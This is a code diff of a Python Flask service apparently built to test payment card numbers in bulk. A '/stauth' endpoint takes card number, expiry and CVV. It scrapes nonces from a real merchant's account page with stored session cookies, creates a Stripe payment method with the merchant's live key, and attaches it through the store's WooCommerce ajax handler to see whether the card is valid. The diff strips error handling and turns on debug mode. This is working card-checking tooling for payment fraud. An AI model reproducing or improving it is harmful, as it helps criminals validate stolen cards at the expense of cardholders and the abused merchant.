@@ -1,7 +1,6 @@
 from flask import Flask, request, jsonify
 import requests
 import re
-import os
 
 app = Flask(__name__)
 
@@ -40,7 +39,7 @@ HEADERS_AJAX = {
 }
 
 def parse_card_details(card_string):
-    """Parse card string in format: CC|MM|YY|CVV"""
+    """Parse card string in format: CC|MM|YY|CVV or CC|MM|YY or CC|MM|YY|CVV"""
     parts = card_string.split('|')
     
     if len(parts) >= 3:
@@ -48,6 +47,7 @@ def parse_card_details(card_string):
         exp_month = parts[1].zfill(2)
         exp_year = parts[2]
         
+        # Handle 2-digit year (26 -> 2026, but Stripe needs 26 or 2026?)
         if len(exp_year) == 2:
             exp_year = exp_year
         
@@ -59,71 +59,58 @@ def parse_card_details(card_string):
             'exp_year': exp_year,
             'cvv': cvv
         }
-    return None
+    else:
+        return None
 
 def get_nonces():
     """Extract both nonces from the page"""
-    try:
-        response = requests.get('https://www.strymon.net/my-account/add-payment-method/', 
-                               cookies=COOKIES, 
-                               headers=HEADERS_PAGE, 
-                               timeout=30)
-        
-        if response.status_code != 200:
-            return None, None
-        
-        checkout_nonce_match = re.search(r'"createCheckoutSessionNonce":"([^"]+)"', response.text)
-        ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
-        
-        checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else None
-        ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
-        
-        return checkout_nonce, ajax_nonce
-    except Exception as e:
-        print(f"Error getting nonces: {e}")
+    response = requests.get('https://www.strymon.net/my-account/add-payment-method/', 
+                           cookies=COOKIES, 
+                           headers=HEADERS_PAGE)
+    
+    if response.status_code != 200:
         return None, None
+    
+    checkout_nonce_match = re.search(r'"createCheckoutSessionNonce":"([^"]+)"', response.text)
+    ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
+    
+    checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else None
+    ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
+    
+    return checkout_nonce, ajax_nonce
 
 def create_stripe_payment_method(card_details):
     """Create payment method in Stripe"""
-    try:
-        stripe_data = f'type=card&card[number]={card_details["number"]}&card[cvc]={card_details["cvv"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6f8494a281%3B+stripe-js-v3%2F6f8494a281%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.strymon.net&time_on_page=42341&client_attribution_metadata[client_session_id]=c4ebef05-119f-4e09-9180-e99f75dff3ff&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1ETKAW8GsA1&client_attribution_metadata[elements_session_config_id]=3f36629e-3a79-4323-bca5-06c46b3daefb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c&sid=89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908&key=pk_live_51KgGVGAoMZ1qjkrWI1y0fQ2e4xAwNwDMuTVGeF9TA4GSTqGZCnJhZJxUeBFXW8hzUI6UiRqKKpNUZyMUMjwkYjGg00rdwxmApR&_stripe_version=2025-09-30.clover'
-        
-        response = requests.post('https://api.stripe.com/v1/payment_methods', 
-                                headers=HEADERS_STRIPE, 
-                                data=stripe_data,
-                                timeout=30)
-        
-        if response.status_code == 200:
-            return response.json().get('id')
-        return None
-    except Exception as e:
-        print(f"Error creating payment method: {e}")
-        return None
+    stripe_data = f'type=card&card[number]={card_details["number"]}&card[cvc]={card_details["cvv"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6f8494a281%3B+stripe-js-v3%2F6f8494a281%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.strymon.net&time_on_page=42341&client_attribution_metadata[client_session_id]=c4ebef05-119f-4e09-9180-e99f75dff3ff&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1ETKAW8GsA1&client_attribution_metadata[elements_session_config_id]=3f36629e-3a79-4323-bca5-06c46b3daefb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c&sid=89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908&key=pk_live_51KgGVGAoMZ1qjkrWI1y0fQ2e4xAwNwDMuTVGeF9TA4GSTqGZCnJhZJxUeBFXW8hzUI6UiRqKKpNUZyMUMjwkYjGg00rdwxmApR&_stripe_version=2025-09-30.clover'
+    
+    response = requests.post('https://api.stripe.com/v1/payment_methods', 
+                            headers=HEADERS_STRIPE, 
+                            data=stripe_data)
+    
+    if response.status_code == 200:
+        return response.json().get('id')
+    return None
 
 def attach_payment_method(payment_method_id, ajax_nonce):
     """Attach payment method to WordPress account"""
-    try:
-        ajax_data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': payment_method_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': ajax_nonce,
-        }
-        
-        response = requests.post('https://www.strymon.net/wp-admin/admin-ajax.php',
-                                cookies=COOKIES,
-                                headers=HEADERS_AJAX,
-                                data=ajax_data,
-                                timeout=30)
-        
-        return response.json()
-    except Exception as e:
-        print(f"Error attaching payment method: {e}")
-        return {'success': False, 'error': str(e)}
+    ajax_data = {
+        'action': 'wc_stripe_create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': payment_method_id,
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': ajax_nonce,
+    }
+    
+    response = requests.post('https://www.strymon.net/wp-admin/admin-ajax.php',
+                            cookies=COOKIES,
+                            headers=HEADERS_AJAX,
+                            data=ajax_data)
+    
+    return response.json()
 
 @app.route('/stauth', methods=['GET', 'POST'])
 def stauth():
     """Main API endpoint"""
+    # Get card details from query parameter or form data
     if request.method == 'GET':
         card_param = request.args.get('cc')
     else:
@@ -135,6 +122,7 @@ def stauth():
             'error': 'Missing card parameter. Use format: ?cc=CC|MM|YY|CVV'
         }), 400
     
+    # Parse card details
     card_details = parse_card_details(card_param)
     if not card_details:
         return jsonify({
@@ -142,6 +130,7 @@ def stauth():
             'error': 'Invalid card format. Use: CC|MM|YY|CVV (e.g., 4400430268343784|02|26|232)'
         }), 400
     
+    # Get nonces
     checkout_nonce, ajax_nonce = get_nonces()
     if not ajax_nonce:
         return jsonify({
@@ -149,6 +138,7 @@ def stauth():
             'error': 'Failed to fetch nonces. Session may be expired.'
         }), 500
     
+    # Create payment method in Stripe
     payment_method_id = create_stripe_payment_method(card_details)
     if not payment_method_id:
         return jsonify({
@@ -156,8 +146,10 @@ def stauth():
             'error': 'Failed to create payment method in Stripe. Card may be invalid.'
         }), 400
     
+    # Attach to WordPress
     result = attach_payment_method(payment_method_id, ajax_nonce)
     
+    # Return response exactly as received from WordPress
     return jsonify({
         'success': result.get('success', False),
         'payment_method_id': payment_method_id,
@@ -174,5 +166,4 @@ def health():
     return jsonify({'status': 'ok'})
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000, debug=True)
